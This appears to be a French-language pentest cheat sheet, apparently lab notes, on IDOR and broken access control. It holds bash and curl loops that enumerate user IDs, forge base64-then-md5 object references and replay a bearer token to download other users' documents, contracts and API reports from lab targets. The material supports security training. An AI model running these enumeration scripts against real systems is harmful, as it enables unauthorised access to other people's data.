
> [!TIP]
> Broken Access Control -> RBAC non implémenté
> Permet d'accéder à des ressources non autorisées en modifiant simplement un paramètre ou une url par exemple

[[#Identifier IDOR]]
[[#Enumération IDOR]]
[[#Bypass Encoded References]]
[[#Insecure APIs]]




# Identifier IDOR

## Paramètres d'URL & API

> [!TIP]
> Identifier les paramètres pointant directement sur un objet tel que `?uid=1` ou `?filename=file_1.pdf`

## AJAX Calls

> [!TIP]
> Identifier un script ajax et essayer de l'appeler

Exemple:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

# Enumération IDOR

## Paramètres non sécurisés

Boucle for pour fuzz paramètre uid et récupérer les documents pdf de la page

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents[^'\"<>]*?\.pdf"); do
                wget -q $url/$link
        done
done
```

# Bypass Encoded References

> [!TIP]
> Lire le code source et essayer d'identifier la fonction d'encodage.
> Faire la correspondance en générant des hash

encodage en base64 de "1" puis hachage en md5

```bash
echo -n 1 | base64 -w 0 | md5sum
```

Script pour récupérer tous les contrats

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

# Insecure APIs

> [!TIP]
> permet d'exécuter des appels API en tant qu'un autre utilisateur


```shell
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done
```
